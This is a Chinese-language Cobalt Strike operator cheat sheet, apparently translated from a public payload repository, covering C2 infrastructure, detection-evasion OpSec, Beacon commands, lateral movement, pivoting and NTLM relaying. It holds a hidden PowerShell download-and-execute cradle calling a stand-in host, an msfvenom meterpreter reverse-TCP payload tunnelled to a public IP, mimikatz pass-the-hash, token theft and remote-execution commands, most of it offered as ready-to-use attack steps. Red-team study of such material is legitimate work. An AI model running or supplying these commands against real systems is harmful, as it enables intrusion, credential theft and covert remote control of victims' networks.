# Cobalt Strike

> Cobalt Strike 是一款威胁模拟软件。红队和渗透测试人员使用 Cobalt Strike 来演示入侵风险并评估成熟的安全计划。Cobalt Strike 可以利用网络漏洞、发起鱼叉式钓鱼攻击、托管 Web 挂马攻击，并通过功能强大的图形用户界面生成受恶意软件感染的文件，该界面鼓励协作并报告所有活动。

```powershell
sudo apt-get update
sudo apt-get install openjdk-11-jdk
sudo apt install proxychains socat
sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
./cobaltstrike
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
```

## 目录 (Summary)

* [基础设施 (Infrastructure)](#infrastructure)
    * [重定向器 (Redirectors)](#redirectors)
    * [域名置前 (Domain fronting)](#domain-fronting)
* [运维安全 (OpSec)](#opsec)
    * [客户 ID (Customer ID)](#customer-id)
* [Malleable C2](#malleable-c2)
* [文件操作 (Files)](#files)
* [Powershell 与 .NET](#powershell-and-net)
    * [Powershell 命令 (Powershell commands)](#powershell-commands)
    * [.NET 远程执行 (.NET remote execution)](#net-remote-execution)
* [横向移动 (Lateral Movement)](#lateral-movement)
* [VPN 与跳板 (VPN & Pivots)](#vpn--pivots)
* [Beacon 对象文件 (Beacon Object Files / BOF)](#beacon-object-files)
* [通过 Cobalt Strike 进行 NTLM 重放 (NTLM Relaying via Cobalt Strike)](#ntlm-relaying-via-cobalt-strike)
* [参考资料 (References)](#references)

## 基础设施 (Infrastructure)

### 重定向器 (Redirectors)

```powershell
sudo apt install socat
socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
```

### 域名置前 (Domain Fronting)

* New Listener (新建监听器) > HTTP Host Header
* 选择“金融与医疗 (Finance & Healthcare)”领域的域名

## 运维安全 (OpSec)

**不要 (Don't)**

* 使用默认的自签名 HTTPS 证书
* 使用默认端口 (50050)
* 使用 0.0.0.0 DNS 响应
* Metasploit 兼容性，请求 payload：`wget -U "Internet Explorer" http://127.0.0.1/vl6D`

**要 (Do)**

* 使用重定向器 (Apache, CDN, ...)
* 设置防火墙，仅接受来自重定向器的 HTTP/S 流量
* 防火墙策略封锁 50050 端口，通过 SSH 隧道进行访问
* 编辑默认的 HTTP 404 页面，设置 Content type 为 text/plain
* 禁止暂存 (No staging)，在 Malleable C2 中将 `set hosts_stage` 设置为 `false`
* 使用 Malleable Profile 针对特定攻击者定制攻击行为

### 客户 ID (Customer ID)

> 客户 ID (Customer ID) 是与 Cobalt Strike 许可证密钥关联的 4 字节数字。Cobalt Strike 3.9 及更高版本将此信息嵌入到由 Cobalt Strike 生成的 payload stager 和 stage 中。

* 在 Cobalt Strike 3.9 及更高版本中，客户 ID 值是 Cobalt Strike payload stager 的最后 4 个字节。
* 试用版的客户 ID 值为 0。
* Cobalt Strike 不会在其网络流量或工具的其他部分中使用客户 ID 值。

## Malleable C2

Github 上托管的 Malleable Profiles 列表：

* Cobalt Strike - Malleable C2 Profiles [xx0hcd/Malleable-C2-Profiles](https://github.com/xx0hcd/Malleable-C2-Profiles)
* Cobalt Strike Malleable C2 设计与参考指南 [threatexpress/malleable-c2](https://github.com/threatexpress/malleable-c2)
* Malleable-C2-Profiles [rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
* SourcePoint 是一款 C2 配置文件生成器 [Tylous/SourcePoint](https://github.com/Tylous/SourcePoint)

语法示例：

```powershell
set useragent "SOME AGENT"; # 正确
set useragent 'SOME AGENT'; # 错误
prepend "This is an example;";

# 转义双引号
append "here is \"some\" stuff";
# 转义反斜杠
append "more \\ stuff";
# 某些特殊字符不需要转义
prepend "!@#$%^&*()";
```

使用 `./c2lint` 检查配置文件。

* 如果 c2lint 完成时没有错误，则返回结果 0
* 如果 c2lint 完成时只有警告，则返回结果 1
* 如果 c2lint 完成时只有错误，则返回结果 2
* 如果 c2lint 完成时同时包含错误和警告，则返回结果 3

## 文件操作 (Files)

```powershell
# 列出指定目录下的文件
beacon > ls <C:\Path>

# 切换到指定的工作目录
beacon > cd [directory]

# 删除文件/文件夹
beacon > rm [file\folder]

# 复制文件
beacon > cp [src] [dest]

# 从 Beacon 宿主机上的路径下载文件
beacon > download [C:\filePath]

# 列出正在进行的下载任务
beacon > downloads

# 取消当前正在进行的下载任务
beacon > cancel [*file*]

# 从攻击机上传文件到当前的 Beacon 宿主机
beacon > upload [/path/to/file]
```

## Powershell 与 .NET

### Powershell 命令

```powershell
# 从控制服务器导入 Powershell .ps1 脚本并将其保存在 Beacon 内存中
beacon > powershell-import [/path/to/script.ps1]

# 设置绑定到 localhost 的本地 TCP 服务器，并使用 powershell.exe 下载上面导入的脚本。然后执行指定的函数和任何参数，并返回输出。
beacon > powershell [commandlet][arguments]

# 使用非托管 Powershell (Unmanaged Powershell) 启动给定函数，且不启动 powershell.exe。所使用的程序由 spawnto 设置。
beacon > powerpick [commandlet] [argument]

# 将非托管 Powershell 注入特定进程并执行指定命令。这对于长期运行的 Powershell 任务非常有用。
beacon > psinject [pid][arch] [commandlet] [arguments]
```

### .NET 远程执行 (.NET remote execution)

将本地 .NET 可执行文件作为 Beacon 后渗透任务 (post-exploitation job) 运行。

要求：

* 使用“任何 CPU (Any CPU)”配置编译的二进制文件。

```powershell
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly /home/audit/Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe
[+] host called home, sent: 318507 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 
```

## 横向移动 (Lateral Movement)

:warning: 运维安全 (OPSEC) 建议：使用 **spawnto** 命令更改 Beacon 为其后渗透任务启动的进程。默认值为 `rundll32.exe`。

* **portscan**: 在特定目标上执行端口扫描。
* **runas**: `runas.exe` 的封装，使用提供凭据可以以另一个用户身份运行命令。
* **pth**: 通过提供用户名和 NTLM 哈希，你可以执行哈希传递 (Pass The Hash) 攻击并在当前进程中注入 TGT。 \
:exclamation: 此模块需要管理员 (Administrator) 权限。
* **steal_token**: 从指定进程窃取令牌 (token)。
* **make_token**: 通过提供凭据，你可以在当前进程中创建模拟令牌 (impersonation token)，并在被模拟用户的上下文中执行命令。
* **jump**: 提供简单快速的方法，使用 winrm 或 psexec 在目标上生成新的 Beacon 会话进行横向移动。 \
:exclamation: **jump** 模块将使用当前的委派/模拟令牌在远程目标上进行身份验证。 \
:muscle: 我们可以将 **jump** 模块与 **make_token** 或 **pth** 模块结合使用，以实现快速“跳转”到网络上的另一个目标。
* **remote-exec**: 使用 psexec、winrm 或 wmi 在远程目标上执行命令。 \
:exclamation: **remote-exec** 模块将使用当前的委派/模拟令牌在远程目标上进行身份验证。
* **ssh/ssh-key**: 使用带有密码或私钥的 SSH 进行身份验证。适用于 Linux 和 Windows 主机。

:warning: 所有这些命令都会启动 `powershell.exe`。

```powershell
Beacon 远程利用 (Remote Exploits)
======================
jump [module] [target] [listener] 

    psexec x86 使用服务运行 Service EXE artifact
    psexec64 x64 使用服务运行 Service EXE artifact
    psexec_psh x86 使用服务运行 PowerShell 一行命令 (one-liner)
    winrm x86 通过 WinRM 运行 PowerShell 脚本
    winrm64 x64 通过 WinRM 运行 PowerShell 脚本

Beacon 远程执行方法 (Remote Execute Methods)
=============================
remote-exec [module] [target] [command] 

    方法 (Methods)                   描述 (Description)
    -------                         -----------
    psexec                          通过服务控制管理器进行远程执行
    winrm                           通过 WinRM (PowerShell) 进行远程执行
    wmi                             通过 WMI (PowerShell) 进行远程执行

```

运维安全 (Opsec) 安全的哈希传递 (Pass-the-Hash)：

1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
2. `steal_token PID`

### 接管 Artifact (Assume Control of Artifact)

* 使用 `link` 连接到 SMB Beacon
* 使用 `connect` 连接到 TCP Beacon

## VPN 与跳板 (VPN & Pivots)

:warning: 隐蔽 VPN (Covert VPN) 无法在 W10 上运行，且需要管理员权限进行部署。

> 使用 `socks 8080` 在 8080 端口（或你选择的任何其他端口）上设置 SOCKS4a 代理服务器。这将设置一个 SOCKS 代理服务器，通过 Beacon 隧道传输流量。Beacon 的睡眠时间 (sleep time) 会给通过它传输的任何流量增加延迟。使用 `sleep 0` 使 Beacon 每秒签到多次。

```powershell
# 在 teamserver 上的给定端口启动 SOCKS 服务器，通过指定的 Beacon 隧道传输流量。在 /etc/proxychains.conf 中设置 teamserver/端口配置，以便于使用。
beacon > socks [端口]
beacon > socks [port]
beacon > socks [port] [socks4]
beacon > socks [port] [socks5]
beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]
beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]

# 通过指定的 Internet Explorer 进程进行浏览器流量代理。
beacon > browserpivot [pid] [x86|x64]

# 绑定到 Beacon 宿主机上的指定端口，并将任何传入连接转发到被转发的主机和端口。
beacon > rportfwd [绑定端口] [转发主机] [转发端口]

# spunnel : 生成一个 agent 并创建一个指向其控制器的远程端口转发隧道 (reverse port forward tunnel)。 ~= rportfwd + shspawn.
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin

# spunnel_local: 生成一个 agent 并创建一个远程端口转发，通过你的 Cobalt Strike 客户端隧道传输到其控制器
# 然后你可以在你的 MSF 多功能处理器 (multi handler) 上处理返回的连接
beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```

## Beacon 对象文件 (Beacon Object Files / BOF)

> BOF 仅是一块位置无关代码 (Position-Independent Code)，它接收指向某些 Beacon 内部 API 的指针。

示例：<https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h>

* 编译

    ```ps1
    # 使用 Visual Studio 编译：
    cl.exe /c /GS- hello.c /Fohello.o

    # 使用 x86 MinGW 编译：
    i686-w64-mingw32-gcc -c hello.c -o hello.o

    # 使用 x64 MinGW 编译：
    x86_64-w64-mingw32-gcc -c hello.c -o hello.o
    ```

* 执行：`inline-execute /path/to/hello.o`

## 通过 Cobalt Strike 进行 NTLM 重放 (NTLM Relaying via Cobalt Strike)

```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<目标 IP>
beacon> rportfwd_local 8445 <KALI IP> 445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```

## 参考资料 (References)

* [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
* [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
* [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
* [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
* [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
* [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
* [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
* [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
* [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
* [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
* [Cobalt Strike 4.6 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-6-user-guide.pdf)
